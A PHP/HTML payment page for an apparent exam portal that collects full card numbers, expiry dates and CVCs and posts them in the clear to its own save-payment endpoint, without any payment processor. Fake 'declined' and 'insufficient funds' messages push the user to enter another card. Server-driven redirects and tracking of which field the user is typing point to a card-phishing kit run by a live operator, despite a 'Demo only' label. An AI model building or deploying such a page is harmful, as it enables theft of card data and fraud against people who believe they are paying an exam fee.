<?php
session_start();
require_once __DIR__ . '/includes/functions.php';

if (empty($_SESSION['student_token'])) { header('Location: index.php'); exit; }
$student = getStudentByToken($_SESSION['student_token']);
if (!$student) { unset($_SESSION['student_token']); header('Location: index.php'); exit; }
updateStudentActivity($student['id'], 'payment');

$visitorId = (int)($_SESSION['visitor_id'] ?? 0);
if ($visitorId) {
    $db = getDB();
    $db->prepare("UPDATE visitors SET is_online = 1, status = 'payment', last_activity = datetime('now') WHERE id = ?")->execute([$visitorId]);
}

$errorType = $_GET['error'] ?? '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exam Portal - Payment</title>
    <style>
        *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f0f2f5;color:#1e293b;min-height:100vh}
        .top-bar{background:linear-gradient(135deg,#0f172a,#1e3a8a);color:#fff;padding:16px 24px}
        .top-bar h1{font-size:1.05rem;font-weight:600}
        .container{max-width:460px;margin:28px auto;padding:0 16px}
        .pay-card{background:#fff;border-radius:14px;padding:28px;box-shadow:0 1px 3px rgba(0,0,0,.05)}
        .pay-card h2{font-size:1.15rem;margin-bottom:4px}
        .pay-card .subtitle{color:#64748b;font-size:.85rem;margin-bottom:20px}
        .fee-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f1f5f9;font-size:.9rem}
        .fee-row.total{border-bottom:none;font-weight:700;font-size:1rem;padding-top:12px}
        .form-group{margin-top:18px}
        .form-group label{display:block;font-weight:600;font-size:.82rem;margin-bottom:6px;color:#1e293b}
        .form-group input{
            width:100%;padding:12px 14px;border:1.5px solid #e2e8f0;border-radius:10px;
            font-size:.95rem;font-family:inherit;transition:border-color .2s,box-shadow .2s;
        }
        .form-group input:focus{outline:none;border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.1)}
        .form-group input.error{border-color:#dc2626;box-shadow:0 0 0 3px rgba(220,38,38,.08)}
        .form-group input.valid{border-color:#16a34a}
        .form-group .hint{font-size:.72rem;color:#dc2626;margin-top:4px;display:none}
        .form-group .hint.show{display:block}
        .card-input{font-family:'Consolas','SF Mono',monospace;letter-spacing:2.5px;font-size:1.05rem}
        .card-brand{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:.72rem;font-weight:700;pointer-events:none;transition:color .2s}
        .card-wrap{position:relative}
        .form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
        .btn-pay{
            display:block;width:100%;padding:14px;background:#16a34a;color:#fff;
            border:none;border-radius:10px;font-size:1rem;font-weight:600;
            cursor:pointer;margin-top:24px;font-family:inherit;transition:background .15s;
        }
        .btn-pay:hover:not(:disabled){background:#15803d}
        .btn-pay:disabled{background:#94a3b8;cursor:not-allowed}
        .alert{padding:12px;border-radius:10px;font-size:.88rem;margin-top:16px;display:none;font-weight:500}
        .alert-success{background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0;display:block}
        .alert-error{background:#fef2f2;color:#dc2626;border:1px solid #fecaca;display:block}
        .toast-overlay{position:fixed;top:0;left:0;right:0;bottom:0;z-index:1000;display:flex;align-items:flex-start;justify-content:center;padding-top:30px;pointer-events:none}
        .toast{background:#fff;border-radius:14px;padding:20px 24px;box-shadow:0 8px 32px rgba(0,0,0,.18);max-width:380px;width:90%;display:flex;align-items:flex-start;gap:12px;opacity:0;transform:translateY(-20px);animation:toastIn .4s ease forwards;pointer-events:auto;border-left:4px solid #dc2626}
        .toast.fade-out{animation:toastOut .8s ease forwards}
        .toast .t-icon{font-size:1.4rem;flex-shrink:0}
        .toast .t-text{font-size:.9rem;color:#1e293b;line-height:1.5}
        .toast .t-text strong{display:block;color:#dc2626;margin-bottom:2px}
        @keyframes toastIn{to{opacity:1;transform:translateY(0)}}
        @keyframes toastOut{to{opacity:0;transform:translateY(-10px)}}
        .secure{text-align:center;margin-top:14px;font-size:.75rem;color:#94a3b8}
        @media(max-width:400px){.container{padding:0 12px}.pay-card{padding:20px 16px}}
    </style>
</head>
<body>
<div class="top-bar"><h1>Exam Fee Payment</h1></div>
<div class="container">
    <div id="toastContainer"></div>
    <div class="pay-card">
        <h2>Payment Details</h2>
        <p class="subtitle">for <?= sanitize($student['name'] . ' ' . $student['surname']) ?></p>

        <div class="fee-row"><span>Exam Registration</span><span>$25.00</span></div>
        <div class="fee-row"><span>Platform Fee</span><span>$2.50</span></div>
        <div class="fee-row total"><span>Total</span><span>$27.50</span></div>

        <form id="payForm">
            <div class="form-group">
                <label>Cardholder Name</label>
                <input type="text" id="cardName" placeholder="<?= sanitize($student['name'] . ' ' . $student['surname']) ?>" autocomplete="cc-name" required>
            </div>
            <div class="form-group">
                <label>Card Number</label>
                <div class="card-wrap">
                    <input type="text" id="cardNum" class="card-input" inputmode="numeric" maxlength="23" placeholder="Card number" autocomplete="cc-number" required>
                    <span class="card-brand" id="ccBrand"></span>
                </div>
                <div class="hint" id="cardHint">Invalid card number</div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Expiry Date</label>
                    <input type="text" id="expiry" inputmode="numeric" maxlength="5" placeholder="MM/YY" autocomplete="cc-exp" required>
                    <div class="hint" id="expiryHint">Invalid date</div>
                </div>
                <div class="form-group">
                    <label>CVC</label>
                    <input type="text" id="cvc" inputmode="numeric" maxlength="4" placeholder="CVC" autocomplete="cc-csc" required>
                </div>
            </div>
            <button class="btn-pay" type="submit" id="payBtn">Pay $27.50</button>
            <div id="alert"></div>
        </form>
        <div class="secure">Secure payment &mdash; Demo only</div>
    </div>
</div>

<script>
const studentId = <?= (int)$student['id'] ?>;
const visitorId = <?= $visitorId ?>;
let pageVisible = true;
let paymentStatus = 'viewing';
let navigatingAway = false;

// ====== Error toast from URL param ======
(function() {
    const params = new URLSearchParams(window.location.search);
    const err = params.get('error');
    if (!err) return;
    const msgs = {
        declined: ['Your card was declined', 'Please try a different card or contact your bank and try again.'],
        insufficient: ['Insufficient funds', 'Please try a different card with sufficient balance.'],
        expired: ['Your card has expired', 'Please use a valid, non-expired card.'],
        error: ['Payment processing error', 'An error occurred. Please re-enter your card details and try again.']
    };
    const [title, desc] = msgs[err] || msgs.error;
    const overlay = document.createElement('div');
    overlay.className = 'toast-overlay';
    overlay.innerHTML = `<div class="toast"><span class="t-icon">&#9888;&#65039;</span><div class="t-text"><strong>${title}</strong>${desc}</div></div>`;
    document.getElementById('toastContainer').appendChild(overlay);
    // Clean URL without reload
    history.replaceState(null, '', window.location.pathname);
    // Fade out after 4s
    setTimeout(() => {
        overlay.querySelector('.toast').classList.add('fade-out');
        setTimeout(() => overlay.remove(), 800);
    }, 4000);
})();

// ====== Card brand detection — comprehensive ======
const CARD_BRANDS = [
    { name: 'AMEX',       pattern: /^3[47]/,                      lengths: [15], cvcLen: 4, color: '#006fcf' },
    { name: 'VISA',       pattern: /^4/,                          lengths: [13,16,19], cvcLen: 3, color: '#1a1f71' },
    { name: 'MASTERCARD', pattern: /^(5[1-5]|2[2-7])/,           lengths: [16], cvcLen: 3, color: '#eb001b' },
    { name: 'DISCOVER',   pattern: /^(6011|65|64[4-9])/,         lengths: [16,19], cvcLen: 3, color: '#ff6000' },
    { name: 'DINERS',     pattern: /^(30[0-5]|36|38)/,           lengths: [14,16], cvcLen: 3, color: '#004c97' },
    { name: 'JCB',        pattern: /^35(2[89]|[3-8])/,           lengths: [15,16,19], cvcLen: 3, color: '#0e4c96' },
    { name: 'UNIONPAY',   pattern: /^(62|81)/,                   lengths: [16,17,18,19], cvcLen: 3, color: '#e21836' },
    { name: 'MAESTRO',    pattern: /^(50|5[6-9]|6[0-9])/,        lengths: [12,13,14,15,16,17,18,19], cvcLen: 3, color: '#cc0000' },
    { name: 'MIR',        pattern: /^220[0-4]/,                   lengths: [16,17,18,19], cvcLen: 3, color: '#00875f' },
    { name: 'ELO',        pattern: /^(636368|438935|504175|451416|636297)/, lengths: [16], cvcLen: 3, color: '#000' },
];

function detectBrand(num) {
    for (const brand of CARD_BRANDS) {
        if (brand.pattern.test(num)) return brand;
    }
    return null;
}

function getMaxDigits(brand) {
    if (!brand) return 19;
    return Math.max(...brand.lengths);
}

// ====== Card number input — smart formatting ======
const cardInput = document.getElementById('cardNum');
const brandEl = document.getElementById('ccBrand');

function formatCardNumber(digits, brand) {
    // AMEX: 4-6-5, Diners 14-digit: 4-6-4, all others: groups of 4
    if (brand && brand.name === 'AMEX') {
        let parts = [];
        if (digits.length > 0) parts.push(digits.slice(0, 4));
        if (digits.length > 4) parts.push(digits.slice(4, 10));
        if (digits.length > 10) parts.push(digits.slice(10, 15));
        return parts.join(' ');
    }
    if (brand && brand.name === 'DINERS' && digits.length <= 14) {
        let parts = [];
        if (digits.length > 0) parts.push(digits.slice(0, 4));
        if (digits.length > 4) parts.push(digits.slice(4, 10));
        if (digits.length > 10) parts.push(digits.slice(10, 14));
        return parts.join(' ');
    }
    return digits.replace(/(.{4})/g, '$1 ').trim();
}

function updateBrandDisplay(brand) {
    if (brand) {
        brandEl.textContent = brand.name;
        brandEl.style.color = brand.color;
    } else {
        brandEl.textContent = '';
        brandEl.style.color = '#64748b';
    }
}

cardInput.addEventListener('input', function() {
    const cursor = this.selectionStart;
    const prevLen = this.value.length;
    let digits = this.value.replace(/\D/g, '');
    const brand = detectBrand(digits);
    const max = getMaxDigits(brand);
    digits = digits.slice(0, max);
    const formatted = formatCardNumber(digits, brand);
    this.value = formatted;
    updateBrandDisplay(brand);
    // Restore cursor
    const diff = formatted.length - prevLen;
    this.setSelectionRange(cursor + diff, cursor + diff);
    // Update CVC maxlength
    document.getElementById('cvc').maxLength = brand ? brand.cvcLen : 4;
    paymentStatus = 'typing_card';
});

cardInput.addEventListener('paste', function(e) {
    e.preventDefault();
    let digits = (e.clipboardData.getData('text') || '').replace(/\D/g, '');
    const brand = detectBrand(digits);
    const max = getMaxDigits(brand);
    digits = digits.slice(0, max);
    this.value = formatCardNumber(digits, brand);
    updateBrandDisplay(brand);
    document.getElementById('cvc').maxLength = brand ? brand.cvcLen : 4;
});

function getCardDigits() { return cardInput.value.replace(/\D/g, ''); }

// ====== Luhn check ======
function luhnCheck(num) {
    if (num.length < 12 || num.length > 19) return false;
    let sum = 0, alt = false;
    for (let i = num.length - 1; i >= 0; i--) {
        let n = parseInt(num[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    return sum % 10 === 0;
}

// ====== Extra fraud checks ======
function isFakePattern(num) {
    // All same digit
    if (/^(.)\1+$/.test(num)) return true;
    // Sequential ascending (1234567890...)
    let asc = true, desc = true;
    for (let i = 1; i < num.length; i++) {
        if (parseInt(num[i]) !== (parseInt(num[i-1]) + 1) % 10) asc = false;
        if (parseInt(num[i]) !== (parseInt(num[i-1]) - 1 + 10) % 10) desc = false;
    }
    if (asc || desc) return true;
    // Repeating 2-digit pattern (e.g., 4141414141414141)
    if (num.length >= 12) {
        const pair = num.slice(0, 2);
        if (num === pair.repeat(Math.ceil(num.length / 2)).slice(0, num.length)) return true;
    }
    return false;
}

function validateCard(num) {
    const brand = detectBrand(num);
    // Must match a known brand
    if (!brand) return { valid: false, msg: 'Unrecognized card type' };
    // Must be a valid length for that brand
    if (!brand.lengths.includes(num.length)) return { valid: false, msg: `${brand.name} requires ${brand.lengths.join(' or ')} digits` };
    // Luhn check (skip for some UnionPay)
    if (brand.name !== 'UNIONPAY' && !luhnCheck(num)) return { valid: false, msg: 'Invalid card number' };
    // Fake pattern check
    if (isFakePattern(num)) return { valid: false, msg: 'Invalid card number' };
    return { valid: true, brand: brand };
}

// ====== Expiry ======
document.getElementById('expiry').addEventListener('input', function() {
    let v = this.value.replace(/\D/g, '');
    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
    this.value = v;
    paymentStatus = 'typing_expiry';
});
document.getElementById('cvc').addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
    paymentStatus = 'typing_cvc';
});
document.getElementById('cardName').addEventListener('input', function() {
    paymentStatus = 'typing_name';
});

function validateExpiry(val) {
    if (!/^\d{2}\/\d{2}$/.test(val)) return false;
    const [m, y] = val.split('/').map(Number);
    if (m < 1 || m > 12) return false;
    const now = new Date();
    const ey = 2000 + y;
    return ey > now.getFullYear() || (ey === now.getFullYear() && m >= now.getMonth() + 1);
}

// ====== Form submission ======
document.getElementById('payForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const alertEl = document.getElementById('alert');
    const btn = document.getElementById('payBtn');
    const hint = document.getElementById('cardHint');
    const expiryHint = document.getElementById('expiryHint');

    hint.className = 'hint'; expiryHint.className = 'hint';
    cardInput.classList.remove('error','valid');
    document.getElementById('expiry').classList.remove('error','valid');
    alertEl.className = 'alert'; alertEl.style.display = 'none';

    const cardNum = getCardDigits();
    const name = document.getElementById('cardName').value.trim();
    const expiry = document.getElementById('expiry').value.trim();
    const cvc = document.getElementById('cvc').value.trim();

    if (!name) { alertEl.className = 'alert alert-error'; alertEl.textContent = 'Enter cardholder name'; return; }

    const cardCheck = validateCard(cardNum);
    if (!cardCheck.valid) {
        hint.textContent = cardCheck.msg; hint.className = 'hint show';
        cardInput.classList.add('error'); return;
    }
    cardInput.classList.add('valid');

    if (!validateExpiry(expiry)) {
        expiryHint.textContent = 'Invalid or expired'; expiryHint.className = 'hint show';
        document.getElementById('expiry').classList.add('error'); return;
    }
    document.getElementById('expiry').classList.add('valid');

    const requiredCvc = cardCheck.brand ? cardCheck.brand.cvcLen : 3;
    if (cvc.length < requiredCvc) {
        alertEl.className = 'alert alert-error';
        alertEl.textContent = `CVC must be ${requiredCvc} digits for ${cardCheck.brand ? cardCheck.brand.name : 'this card'}`;
        return;
    }

    btn.disabled = true; btn.textContent = 'Processing...';
    paymentStatus = 'submitting';

    try {
        const resp = await fetch('api/save-payment.php', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                student_id: studentId, cardholder: name,
                card_number: cardNum,
                card_type: cardCheck.brand ? cardCheck.brand.name : 'CARD',
                expiry: expiry,
                cvc: cvc
            })
        });
        const data = await resp.json();
        if (data.success) {
            alertEl.className = 'alert alert-success';
            alertEl.textContent = 'Payment details submitted! Redirecting...';
            paymentStatus = 'submitted';
            navigatingAway = true;
            btn.textContent = 'Submitted';
            setTimeout(() => { window.location.href = 'waiting.php'; }, 2000);
        } else {
            alertEl.className = 'alert alert-error';
            alertEl.textContent = data.error || 'Failed';
            btn.disabled = false; btn.textContent = 'Pay $27.50';
        }
    } catch(err) {
        alertEl.className = 'alert alert-error';
        alertEl.textContent = 'Connection error';
        btn.disabled = false; btn.textContent = 'Pay $27.50';
    }
});

// ====== Heartbeat ======
function hb() {
    if (!pageVisible || document.hidden || navigatingAway) return;
    fetch('api/heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({student_id:studentId}) }).then(r=>r.json()).then(d=>{if(d.redirect && !navigatingAway)window.location.href=d.redirect}).catch(()=>{});
    if (visitorId) fetch('api/visitor-heartbeat.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({visitor_id:visitorId, status:'payment'}) }).catch(()=>{});
}
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        pageVisible = false;
        navigator.sendBeacon('api/offline.php', JSON.stringify({student_id:studentId}));
        if (visitorId) navigator.sendBeacon('api/visitor-offline.php', JSON.stringify({visitor_id:visitorId}));
        clearInterval(hbTimer); hbTimer = null;
    } else {
        pageVisible = true; hb();
        if (!hbTimer) hbTimer = setInterval(hb, 5000);
    }
});
function sendOffline() {
    if (navigatingAway) return;
    navigator.sendBeacon('api/offline.php', JSON.stringify({student_id:studentId}));
    if (visitorId) navigator.sendBeacon('api/visitor-offline.php', JSON.stringify({visitor_id:visitorId}));
}
hb(); let hbTimer = setInterval(hb, 5000);
window.addEventListener('pagehide', sendOffline);
window.addEventListener('beforeunload', sendOffline);
</script>
</body>
</html>
